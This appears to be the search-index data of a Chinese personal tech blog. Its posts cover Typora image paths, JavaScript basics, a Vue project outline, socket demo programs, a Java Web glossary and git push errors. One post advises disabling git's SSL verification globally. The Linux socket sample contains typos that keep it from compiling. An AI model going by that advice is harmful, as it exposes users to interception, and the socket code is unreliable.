如果只是把Typora当作本地的笔记用，就不需要进行下一步了。如果是想把博客推送到远端，那么必须要进行第七步的操作。 点击引入的图片，做一些修改。如下图把橙色部分的文字都删掉，然后删掉..。 把它变成： 1![](/) 这种形式。 完成了上面的操作，之后再进行图片的引入，只需要重复4、5、6、7步骤就好了，极其方便！ 一些解释很多同学可能会对删除..有困惑，在给出的例子中，明明images在.md文件的上级，为什么要删掉..呢？ 如上图所示，在我把文件推送到远端之后，文件的排布如上。这里我们要转变一下思想，本地端的相对地址同服务器端的相对地址是不一样的。本地端的相对地址是以本文件所在的位置为核心，例如../images，在本地端代表的意思是.md上级文件夹中的images文件的位置。他是从.md出发的。然而在服务器端，我们写的相对地址其实是在补充，他是从服务器端的ip地址开始的，如下图红色标注的部分 补充的是橙色标注部分后面的内容。 如上图所示，可以看到当路径补充完整后，其格式同我们上面的相对路径相同。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"玩转JavaScript(一)","date":"2021-05-22T07:50:28.000Z","path":"2021/05/22/玩转JavaScript-一/","text":"初探JavaScript前言昨夜山河齐恸震，今朝大星辞九州。在写这篇博客的时候，袁老逝世了。在神农离去的两分钟后，吴孟超先生也离开了人世。两位巨人的远去，让我不禁感慨，我们无法抵抗浪潮，但会永远铭记灯塔。 前端知识体系都有什么东东？ HTML：超文本标记语言（Hyper Text Markup Language），决定网页的结构和内容。 CSS：层叠样式表（Cascading Style Sheets），设定网页的表现形式。 CSS预处理器：CSS预处理器定义了一种新的语言，其基本思想是，用一种专门的编程语言，为CSS增加一些编程的特性，将CSS作为目标生成文件，然后开发者就只要使用这种语言进行CSS的编码工作。转化成通俗易懂的话来讲就是，“用一种专门的编程语言，进行Web页面样式设计，再通过编译器转化成为正常的CSS文件，以供项目使用”。 JavaScript：是一种弱类型脚本语言，其源代码不需要经过编译，而是由浏览器解释运行，用于控制网页的行为。 JavaScript框架： jQuery：优点是简化了DOM操作，缺点是DOM操作太频繁，影响前端性能；在前端眼里使用它仅仅是为了兼容IE6\\7\\8； Angular：Google收购的前端框架，由一群Java程序员开发，其特点是将后台的MVC模式搬到了前端并增加了模块化开发的理念，与微软合作，采用TypeScript语法开发；对后台程序员友好，对前端程序员不太友好；最大的缺点是版本迭代不合理（如1代-&gt;2代，除了名字，基本就是两个东西） React：Facebook出品，一款高性能的JS前端框架；特点是提出了新概念【虚拟DOM】用于减少真实DOM操作，在内存中模拟DOM操作，有效提升了前端渲染效率；缺点是复杂，因为需要额外学习一门【JSX】语言； Vue：一款渐进式JavaScript框架，所谓渐进式就是逐步实现新特性的意思，如实现模块化开发、路由、状态管理等新特性。其特点是综合了Angular（模块化）和React（虚拟DOM）的优点； Axios：前端通信框架；因为Vue的边界很明确，就是为了处理DOM，所以并不具备通信能力，此时就需要额外使用一个通信框架与服务器交互；当然也可以直接选择使用jQuery提供的AJAX通信功能； UI框架： Ant-Design:阿里巴巴出品，基于React的UI框架； ElementUI、iview、ice：饿了么出品，基于Vue的UI框架； Bootstrap：Twitter推出的一个用于前端开发的开源工具包； AmazeUI:又叫“妹子UI”，一款HTML5跨屏前端框架； JavaScript构建工具： Babel：JS编译工具，主要用于浏览器不支持的ES新特性，比如用于编译TypeScript； WebPack：模块打包器，主要作用是打包、压缩、合并及按序加载； 三端统一 混合开发（Hybrid App）：主要目的是实现一套代码三端统一（PC\\Android:.apk\\IOS:.ipa）并能够调用到设备底层硬件（如传感器、GPS、摄像头等），打包方式有如下两种： 云打包：HBuild-&gt;HBuildX，DCloud出品；API Cloud； 本地打包：Cordova（前身是PhoneGap）； 微信小程序：详见微信官网，这里就额是介绍一个方便微信小程序UI的框架：WeUI； 后端技术前端人员为了方便开发也需要掌握一定的后端技术，但我们Jaca后台人员知道后台体系极其庞大复杂，所以为了方便前端人员开发后台应用，就出现了Node.js这样的技术。 NodeJS的作者已经声称放弃了NodeJS（说是架构做的不好再加上笨重的node_modules，可能让作者不爽了吧），开始开发全新的架构Deno。 既然是后台技术，那肯定也需要框架和项目管理工具，NodeJS框架及项目管理工具如下： Express:NodeJS框架 Koa：Express简化版 NPM：项目综合管理工具，类似于Maven YARN：NPM的代替方案，类似于Maven和Gradle的关系 什么是 JavaScript？1.概述JavaScript是一门世界上最流行的脚本语言 然而Java和JavaScript鸡毛关系没有，JavaScript名字看起来带Java，实际上是在蹭Java的热度。 一个合格的后端人员，必须要精通JavaScript 2.历史ECMAScript它可以理解为是JavaScript的一个标准，最新版本已经到了es6版本，但是大部分浏览器还只停留在支持es5代码上！ 问题所在：开发环境–线下环境 不一致 快速入门1.引入到HTML中lesson1.js 1alert(&#x27;你好啊，中国男孩！&#x27;); lesson1.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!--Script标签内写JavaScript代码--&gt; &lt;script src=&quot;js/lesson1.js&quot;&gt;&lt;/script&gt;&lt;!--javascript标签必须成对出现--&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 效果： 2.基本语法与数据类型JavaScript的基本语法同Java并无太大的差别，我们主要来看定义变量的方式。 lesson2.js 12var num = 1;alert(num); lesson2.html 同lesson1.html相同 效果： JavaScript中变量定义的方法很爽，无需指明变量的类型，直接赋值就好。它其实就像python中变量定义的方法，只不过前面要加一个var。 numberJavaScript不区分整数和小数，只有一个类型number。 123456123//整数123123.1//浮点数123.11.123e3//科学计数法-99//复数NaN//not a numberInfinity//表示无穷大 字符串‘abc’ ， “abc” 布尔值true，false 逻辑运算12345&amp;&amp; //两个都为真，结果为真|| //一个为真，结果为真 ! // 真即假，假为真 比较运算符（重要）123= //赋值== //等于（类型不一样，值一样，也会判断为true）=== // 绝对等于（类型一样，值一样，结果为true） 坚持不要使用==进行比较 须知： NaN===NaN，这个与所有的数值都不相等，包括自己 只能通过isNaN(NaN)来判断这个数是否是NaN 浮点数问题1console.log((1/3)===(1-2/3)) // false 尽量避免使用浮点数进行运算，存在精度问题。 1console.log(Math.abs(1/3-(1-2/3))&lt;0.00000001)// true null和undefined null 空 undefined 未定义 1console.log(a) // undefined 数组定义数组的两种方式： 11.var arr = [1,2,3,4,5,&#x27;hello&#x27;,true,null] Java的数组内必须是相同的数据类型，JavaScript不必。 12.new Array(1,2,3,4,5,&#x27;hello&#x27;,true,null) 为了保证代码的可读性，定义数组尽量使用第一种方式。 如果取数组下标，越界了的话，就会==undefined==。 对象对象是大括号，数组是中括号。 12345var Person = &#123; name:&quot;yaning&quot;, age:20, tags:[&#x27;js&#x27;,&#x27;java&#x27;,&#x27;web&#x27;]&#125; 每个属性之间通过逗号隔开，最后一个不需要添加逗号。 1Person.name // &quot;yaning&quot;","comments":true,"categories":[{"name":"脚本语言","slug":"脚本语言","permalink":"http://1905060202.github.io/categories/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"Java Web","slug":"Java-Web","permalink":"http://1905060202.github.io/tags/Java-Web/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://1905060202.github.io/tags/JavaScript/"}]},{"title":"Vue项目实战-电商管理系统","date":"2021-05-21T13:23:48.000Z","path":"2021/05/21/Vue项目实战-电商管理系统/","text":"0.项目概述电商后台管理系统的功能电商后台管理系统用于管理用户账号、商品分类、商品信息、订单、数据统计等业务功能。 电商后台管理系统的开发模式（前后端分离）电商后台管理系统采用前后端分离的开发模式，其中前端项目是基于Vue技术栈的SPA项目。 电商后台管理系统的技术选型前端项目技术栈 Vue Vue-router Element-UI Axios Echarts 后端项目技术栈 Node.js Express Jwt(状态保持工具,模拟Session) Mysql(后台数据库) Sequelize(操作数据库的框架) 1.项目初始化前端项目初始化步骤 安装Vue脚手架 通过Vue脚手架创建项目 配置Vue路由 配置Element-UI组件库 配置axios远程仓库 初始化git远程仓库 将本地项目托管到Github中","comments":true,"categories":[{"name":"项目实战","slug":"项目实战","permalink":"http://1905060202.github.io/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"框架","slug":"框架","permalink":"http://1905060202.github.io/tags/%E6%A1%86%E6%9E%B6/"},{"name":"Vue","slug":"Vue","permalink":"http://1905060202.github.io/tags/Vue/"}]},{"title":"玩转socket（六）","date":"2021-05-05T13:45:20.000Z","path":"2021/05/05/玩转socket（六）/","text":"Windows下的Socket演示程序上节演示了Linux下的socket程序，这节来看一下Windows下的socket程序。同样，server.cpp为服务端代码，client为客户端代码。 服务端代码 server.cpp： 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;winsock2.h&gt;#pragma comment(lib,&quot;ws2_32.lib&quot;) //加载 ws2_32.dllint main()&#123; //初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2,2),&amp;wsaData); //创建套接字 SOCKET servSock = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP); //绑定套接字 sockaddr_in sockAddr; memset(&amp;sockAddr,0,sizeof(sockAddr));//每个字节都用0填充 sockAddr.sin_family = PF_INET;//使用IPv4地址 sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);//使用具体的IP地址 sockAddr.sin_port = htons(1234);//端口 bind(servSock,(SOCKADDR*)&amp;sockAddr,sizeof(SOCKADDR)); //进入监听状态 listen(servSock,20); //接收客户端请求 SOCKADDR clntAddr; int nSize = sizeof(SOCKADDR); SOCKET clntSock = accept(servSock,(SOCKADDR*)&amp;clntAddr,&amp;nSize); //向客户端发送数据 char *str = &quot;Hello World!&quot;; send(clntSock,str,strlen(str)+sizeof(char),NULL); //关闭套接字 closesocket(clntSock); closesocket(servSock); //终止DLL的使用 WSACleanup(); return 0;&#125; 客户端代码client.cpp： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //加载 ws2_32.dllint main()&#123; //初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //向服务器发起请求 sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //每个字节都用0填充 sockAddr.sin_family = PF_INET; sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); sockAddr.sin_port = htons(1234); connect(sock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //接收服务器传回的数据 char szBuffer[MAXBYTE] = &#123;0&#125;; recv(sock, szBuffer, MAXBYTE, NULL); //输出接收到的数据 printf(&quot;Message form server: %s\\n&quot;, szBuffer); //关闭套接字 closesocket(sock); //终止使用 DLL WSACleanup(); system(&quot;pause&quot;); return 0;&#125; 将server.cpp和client.cpp分别编译为server.exe和client.exe，先运行server.exe，再运行client.exe，输出结果为：Message form server：Hello World！ Windows下的Socket程序和Linux思路相同，但细节有所差别： Windows下的socket程序依赖Winsock.dll或ws2_32.dll，必须提前加载。DLL有两种加载方式：隐式加载(载入时加载)和显式加载(运行时加载)。 Linux使用“文件描述符”的概念，而Windows使用“文件句柄”的概念；Linux不区分socket文件和普通文件，而Windows区分；Linux下socket()函数的返回值为int类型，而Windows下为SOCKET类型，也就是句柄。 Linux下使用read()/write()函数读写，而Windows下使用recv()/send()函数发送和接收。 关闭socket时，Linux使用close()函数，而Windows使用closesocket()函数","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://1905060202.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"socket","slug":"socket","permalink":"http://1905060202.github.io/tags/socket/"},{"name":"C语言中文网","slug":"C语言中文网","permalink":"http://1905060202.github.io/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"}]},{"title":"玩转socket（五）","date":"2021-05-04T14:51:21.000Z","path":"2021/05/04/玩转socket（五）/","text":"Linux下的socket演示程序本节演示了Linux下的代码，server.cpp是服务器端代码，client.cpp是客户端代码，要实现的功能是：客户端从服务器读取一个字符串并打印出来。 服务器端代码 server.cpp： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;int main()&#123; //创建套接字 int serv_sock = socket(AF_INET,SOCK_STREAM,IPPROTP_TCP); //将套接字和IP、端口绑定 struct sockaddr_in serv_addr; memset(&amp;serv_addr,0,sizeof(serv_addr));//每个字节都用0填充 serv_addr.sin_family = AF_INET;//使用IPv4地址 serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);//使用具体IP地址 serv_addr.sin_port = htons(1234);//端口 bind(serv_sock,(struct sockaddr*)&amp;serv_addr,sizeof(serv_addr)); //进入监听器，等待用户发起请求 listen(serv_sock,20); //接收客户端请求 struct sockaddr_in clnt_addr; socklen_t clnt_addr_size = sizeof(clnt_addr); int clnt_sock = accept(serv_sock,(struct sockaddr*)&amp;clnt_addr,&amp;clnt_addr_size); //向客户端发送数据 char str[] = &quot;http://1905060202.github.io&quot;; write(clnt_sock,str,sizeof(str)); //关闭套接字 close(slnt_sock); close(serv_sock); return 0;&#125; 客户端代码 client.cpp: 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;int main()&#123; //创建套接字 int sock = socket(AF_INET,SOCK_STREAM,0); //向服务器（特定的IP和端口）发起请求 struct sockaddr_in servaddr; memset(&amp;serv_addr,0,sizeof(serv_addr));//每个字节都用0填充 serv_addr.sin.family = AF_INET;//使用IPv4地址 serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;)//具体的IP地址 serv_addr.sin_port = htons(1234);//端口 connect(sock,(struct sockaddr*)&amp;serv_addr,sizeof(serv_addr)); //读取服务器传回的数据 char buffer[40]; read(sock,buffer,sizeof(buffer)-1); printf(&quot;Message form server :%s\\n&quot;,buffer); //关闭套接字 close(sock); return 0;&#125; 启动一个终端（shell），先编译server.cpp并运行： 123[admin@loaclhost ~]$g++server.cpp -o server[admin@localhost ~]$./clientMessage form server.http://1905060202.github.io client接收到从server发送过来的字符串就运行结束了，同时server完成发送字符串的任务也运行结束了。大家可以通过两个打开的终端来观察。 client运行后，通过connect()函数向server发起请求，处于监听状态的server被激活，执行accept()函数，接收客户端的请求，然后执行write()函数向client传回数据。client接收到传回的数据后，connect()函数就运行结束了，然后使用read()将数据读取出来。 源码解析server.cpp： 第11行通过socket()函数创建了一个套接字，参数AF_INET表示使用IPv4地址，SOCK_STREAM表示使用面向连接的套接字，IPPROTP_TCP表示使用TCP协议。在Linux中，socket也是一种文件，有文件描述符，可以使用write()或read()函数进行I/O操作。 第19行通过bind()函数将套接字serv_sock与特定的IP地址和端口绑定，IP地址和端口都保存在sockaddr_in结构体中。 socket()函数确定了套接字的各种属性，bind()函数让套接字与特定的IP地址和端口对应起来，这样客户端才能连接到该套接字。 第22行让套接字处于被动监听的状态。所谓被动监听，是指套接字一直处于“睡眠”状态，直到客户端发起请求才会被“唤醒” 第27行的accept()函数用来接收客户端的请求。程序一旦执行到accept()就会被阻塞，直到客户端发起请求。 第31行的write()函数用来向套接字文件中写入数据，也就是向客户端发送数据。 client.cpp: 第18行代码通过connect()向服务器发起请求，服务器的IP地址和端口号保存至sockaddr_in结构体中。直到服务器传回数据后，connect()才结束运行。 第22行代码通过read()从套接字中读取文件。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://1905060202.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"socket","slug":"socket","permalink":"http://1905060202.github.io/tags/socket/"},{"name":"C语言中文网","slug":"C语言中文网","permalink":"http://1905060202.github.io/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"}]},{"title":"湖南科大Web期中考试复习参考","date":"2021-04-28T13:40:48.000Z","path":"2021/04/28/湖南科大Web期中考试复习参考/","text":"名词解释 Socket：套接字，网络上的两个程序通过一个双向的通信连接实现数据的交换，这个连接的一端称为一个Socket JVM：Java虚拟机是运行所有Java程序的抽象计算机，是Java语言的运行环境。 Web：web是分布在全世界的、基于HTTP通信协议的、存储在web服务器中的所有互相连接的超文本集 C/S：Clien/Sever或客户/服务器模式 B/S：将web浏览器/web服务器工作模式简称为B/S HTTP：超文本传输协议，是专门为web设计的一种网络通信协议 Html：超级文本标记语言是标准通用标记语言下的一个应用，也是一种规范，一种标准，它通过标记符号来标记要显示的网页中的各个部分 JS：JavaScript是一种嵌入在HTML文档中，具有跨平台、安全性，基于对象和事件驱动的解释型编程脚本语言 CSS：级联样式表是一种用来表现HTML或XML等文件样式的计算机语言 JSP：一种运行在服务器端的脚本语言 Tomcat：Tomcat服务器是一个免费的开放源码的Web应用服务器，属于轻量级应用服务器 ODBC：开放数据库连接是微软公司开放服务结构中有关数据库的一个组成部分，它建立了一组规范，并提供了一组对数据库访问的标准API JDBC：JDBC是一种访问数据库的技术标准，它是一种能通过Java语言访问数据库的应用程序接口，由一组用Java语言编写的类和接口组成。 JavaBean：JavaBean是Java Web程序的重要组成部分，是一个可以重复使用的软件组件，是一个遵循特定写法的Java类，它封装了数据和业务逻辑，供JSP或Servlet调用，完成数据封装和数据处理功能 Servlet：Servlet是用Java语言编写的服务器端程序，它担当客户请求与服务器响应的中间层，属于JavaEE中间层技术，是由服务器端调用和执行，可以处理客户端传来的HTTP请求，并返回一个响应 XML：可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言 Struts2：Struts2是Apache软件组织的一项开放源码项目，它是对经典设计模式MVC的一种实现，并且是基于webwork核心思想的一种全新架构","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"习题","slug":"习题","permalink":"http://1905060202.github.io/tags/%E4%B9%A0%E9%A2%98/"},{"name":"Java Web","slug":"Java-Web","permalink":"http://1905060202.github.io/tags/Java-Web/"}]},{"title":"玩转socket（四）","date":"2021-04-27T07:18:09.000Z","path":"2021/04/27/玩转socket（四）/","text":"OSI网络七层模型、TCP/IP协议族、IP、MAC和端口号本讲分三个部分： OSI网络七层模型 TCP/IP协议族 IP、MAC和端口号 OSI网络七层模型如果你读过计算机专业，或者学习过网络通信（很遗憾，我的专业教学越过了网络通信），那你一定听说过OSI模型，它曾无数次让你头大。OSI是Open System Interconnection的缩写，译为“开放式系统互联”。 OSI模型把网络通信的工作分为七层，从下到上分别是物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。 OSI只是存在于概念和理论上的一种模型，它的缺点是分层太多，增加了网络工作的复杂性，所以没有大规模应用。后来人们对OSI进行了简化，合并了一些层，最终只保留了4层，从下到上分别是接口层、网络层、传输层和应用层。这就是鼎鼎大名的TCP/IP模型。图1：OSI 七层网络模型和 TCP/IP 四层网络模型的对比图2：OSI 七层网络模型和 TCP/IP 四层网络模型的对比 这个网络模型究竟是干什么的呢？简而言之就是进行数据封装的。 我们平常使用的程序（或者说软件）一般都是通过应用层来访问网络的，程序产生的数据会一层一层地往下传输，直到最后的网络接口层，就通过网线发送到互联网上去了。数据每往下走一层，就会被这一层地协议增加一层包装，等到发送到互联网上时，已经比原始数据多了四层包装。整个数据封装的过程就像俄罗斯套娃。 当另一台计算机接收到数据包时，会从网络接口再一层一层往上传输，每传输一层就拆开一层包装，直到最后的应用层，就得到了最原始的数据，这才是程序要使用的数据。 给数据加包装的过程，实际上就是在数据头增加一个标志（一个数据块），表示数据经过了这一层，我已经处理了。给数据拆包的过程正好相反，就是去掉数据头部的标志，让它逐渐现出原形。 所以，在互联网上传输一份数据是多么的复杂！而我们却感受不到，这就是网络模型的厉害之处。我们只需要在代码中调用一个函数，就能让下面的所有网络层为我们工作。 我们所说的socket编程，是站在传输层的基础上，所以可以使用TCP/UDP协议，但是不能干访问网页这样的事情，因为访问网页所需要的http协议位于应用层。 两台计算机进行通信时，必须遵循以下原则： 必须是同一层次进行通信，比如，A计算机的应用层和B计算机的传输层就不能通信，因为它们不在一个层次，数据的拆包会遇到问题。 每一层的功能都必须相同，也就是拥有完全相同的网络模型。如果网络模型都不同，那不就乱套了，谁都不认识谁。 数据只能逐层传输，不能跃层。 每一层可以使用下层提供的服务，并向上层提供服务。 TCP/IP协议族上面讲到，目前实际使用的网络模型时TCP/IP模型，它对OSI模型进行了简化，只包含了四层，从上到下分别是应用层、传输层、网络层和网络接口层，每一层都包含了若干协议。 协议(Protocol)就是网络通信过程中的约定或者合同，通信双方必须都遵循才能正常收发数据。协议有很多种，例如TCP、UDP、IP等，通信双方必须使用同一协议才能通信。协议是一种规范，由计算机组织制定，规定了很多细节，例如，如何建立连接，如何相互识别等。 协议仅仅是一种规范，必须由计算机软件来实现。例如IP协议规定了如何找到目标计算机，那么各个开发商在开发自己的软件时就必须遵循该协议，不能另起炉灶。 TCP/IP模型包含了TCP、IP、UDP、Telnet、FTP、SMTP等上百种互为关联的协议，其中TCP和IP是最常见的两种底层协议，所以把他们统称为“TCP/IP协议族” 也就是说，“TCP/IP”模型”中所涉及到的协议称为“TCP/IP协议族”，你可以区分这两个概念，也可以认为他们是等价的，随便你怎么想。 本文所讲的socket编程是基于TCP和UDP协议的，他们的层级关系如下： 图3：TCP和UDP协议的层级关系 开放式系统（Open System）把协议分成多个层次有哪些优点？协议设计更容易？当然这也足以成为优点之一。但是还有更重要的原因，就是为了通过标准化操作设计成开放式系统。 标准本身就是对外公开的，会引导更多的人遵守规范。以多个标准为依据设计的系统称为开放式系统，我们学习的TCP/IP协议族也属于其中之一。 接下来了解一下开放式系统具有哪些优点。 路由器用来完成IP层的交互任务。某个网络原来使用A公司的路由器，现要将其替换成B公司的，是否可行？这并非难事，并不一定要换成同一公司的同一型号路由器，因为所有生产商都会按照IP层标准制造。 再举个例子。大家的计算机是否装有网络接口卡，也就是所谓的网卡？尚未安装也无妨，其实很容易买到，因为所有网卡制造商都会遵循链路层的协议标准。这就是开放式系统的优点。 标注的存在意味着高速的技术发展，这也是开放式系统设计最大的原因所在。实际上，软件工程中的“面向对象”的诞生背景中也有标准化的影子也就是说，标准对于技术发展起着举足轻重的作用。 IP、MAC和端口号在茫茫的互联网汪洋中，要找到一台计算机非常不容易，有三个要素必须具备，它们分别是IP地址、MAC地址和端口号。 IP地址IP地址是Internet Protocol Address的缩写，译为“网际协议地址”。目前大部分软件使用IPv4地址，但IPv6也正在被人们接受（实际上很多人已经在用IPv6了），尤其是在教育网中，已经大量使用。 一台计算机可以拥有一个独立的IP地址，一个局域网也可以拥有一个独立的IP地址（对外就好像只有一台计算机）。目前广泛使用的ipv4地址，它的资源是非常有限的，一台计算机一个IP地址是不现实的，往往是一个局域网才拥有一个IP地址。 在互联网上进行通信时，必须要知道对方的IP地址。实际上数据包中已经附带了IP地址，把数据包发送给路由器后，路由器会根据IP地址找到对方的地理位置，完成一次数据的传递。路由器有非常高效和智能的算法，很快会找到目标计算机。 MAC地址现实情况是，一个局域网往往才能拥有一个独立的IP；换句话说，IP地址只能定位到一个局域网，无法定位到具体的一台计算机。这可怎么办呀？这样也没法通信呀！ 其实，真正能唯一标识一台计算机是MAC地址，每个网卡的MAC地址在全世界都是独一无二的。计算机出厂时，MAC地址已经被写死到网卡里了（当然，通过某些“奇淫巧技”也是可以修改的）。局域网中的路由器/交换机会记录每台计算机的MAC地址。 MAC地址是Media Access Control Address的缩写，直译为“媒体访问控制地址”，也称为局域网地址（LAN Address），以太网地址或物理地址。 数据包中除了会附带IP地址，还会附带对方的MAC地址，当数据包达到局域网以后，路由器/交换机会根据数据包中的MAC地址找到对应的计算机，然后把数据包转交给它；这样就完成了数据的传递。 端口号有了IP地址和MAC地址，虽然可以找到目标计算机，但仍不能进行通信。一台计算机可以同时提供多种网络服务，例如Web服务，FTP服务（文件传输服务）、SMTP服务（邮箱服务）等，仅有IP地址和MAC地址，计算机虽然可以正确地接收到数据包，但是却不知道要将数据包交给哪个网络程序来处理，所以通信失败。 为了区分不同的网络程序，计算机会为每个网络程序分配一个独一无二的端口号（Port Number），例如，Web服务的端口是80，FTP服务的端口是21，SMTP服务的端口是25. 端口（Port）是一个虚拟的、逻辑上的概念。可以将端口理解为一道门，数据通过这道门流入流出，每道门有不同的编号，就是端口号。 图4：端口号对应的网络服务 本节完","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://1905060202.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"socket","slug":"socket","permalink":"http://1905060202.github.io/tags/socket/"},{"name":"C语言中文网","slug":"C语言中文网","permalink":"http://1905060202.github.io/tags/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E6%96%87%E7%BD%91/"}]},{"title":"hexo推送出错如何解决？","date":"2021-04-27T06:26:49.000Z","path":"2021/04/27/hexo推送出错如何解决？/","text":"Hexo报错(git) Failed to connect to github.com port 443: Timed out 或 OpenSSL SSL_read: Connection was reset, errno 10054的解决方法1在使用hexo博客运行 hexo d 出现报错Time out,是代理的问题。如果你在科学上网，那么需要设置http代理端口,http.proxy。我的代理端口是8787. 12git config --global http.proxy 127.0.0.1:8787git config --global https.proxy 127.0.0.1:8787 如果之前已有设置，先取消再设置。 12git config --global --unset http.proxygit config --global --unset https.proxy 设置好之后再hexo d，部署成功！ 如果这种方法不奏效，使用下面的方法再试试。 方法2错误原因可能是网络不稳定，连接超时造成的，如果试了多次还是报错误，建议执行下面的命令。 1git config --global http.sslVerify &quot;false&quot; 这个命令用来修改设置，解除 SSL 验证。如果这个不奏效，可以试试上面的方法！ 以上就是两种错误的解决方案，在实际操作中，可以都尝试着用一下，说不定就柳暗花明了。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Error解决","slug":"Error解决","permalink":"http://1905060202.github.io/tags/Error%E8%A7%A3%E5%86%B3/"}]},{"title":"愿理想之火不灭","date":"2021-04-23T14:27:37.000Z","path":"2021/04/23/愿理想之火不灭/","text":"人生如逆旅，我亦是行人一路求学，至今已有十四载春秋。从黑龙江一隅考到湖南，跨越一千多公里的距离，去追寻最纯粹的理想。突破了重重阻碍，才来到你的面前。从最初的迷惘，到逐渐找到方向，我用了两年。七百天的光阴如此短暂，却又如此漫长。短到眨眼间的物是人非，长到侧身时的教材成山。我一路追求完美，却最终妥协于完美。虽然遗憾满程，但心中的火种仍在。也许我无法燎原，但理想之火不灭。","comments":true,"categories":[{"name":"闲言碎语","slug":"闲言碎语","permalink":"http://1905060202.github.io/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"}],"tags":[{"name":"人生","slug":"人生","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E7%94%9F/"}]},{"title":"玩转socket（三）","date":"2021-04-21T14:40:06.000Z","path":"2021/04/21/玩转socket（三）/","text":"SOCK_STREAM和SOCK_DGRAM到底有什么区别？上一节《套接字有哪些类型》提到，Stream Sockets就是SOCK_STREAM，它基于TCP协议；Datagram Sockets就是SOCK_DGRAM，它基于UDP协议。这给大家造成一种印象，Stream Sockets就是可靠连接，Datagram Sockets就是不可靠通信，实际情况真的如此吗？ 另外，不管哪种数据传输方式，都得通过整个Internet网络的物理线路将数据传出去，从这个层面理解，所有的socket都是有物理连接的，为什么还有无连接的socket呢？ 从字面上理解，Stream Sockets好像有一条管道，它连接发送端和接收端，数据包通过这条管道来传输。当然，两台计算机在通信之前必须先搭建好管道。Datagram Sockets像是无头苍蝇乱撞，数据包从发送端到接收端没有固定的路线，爱怎么走就怎么走，只要能到达就行。每个数据包都比较自私，不和别人分享自己的线路，但是大家都能殊途同归，到达接收端。 上图是一个简化的互联网模型，H1-&gt;H6表示计算机，A-&gt;E表示路由器，发送端发送的数据必须经过路由器的转发才能达到接收端。 假设H1要发送若干个数据包给H6，那么有多条路径可以选择，比如： 路径1：H1–&gt;A–&gt;C–&gt;E–&gt;H6 路径2：H1–&gt;A–&gt;B–&gt;E–&gt;H6 路径3：H1–&gt;B–&gt;D–&gt;E–&gt;H6 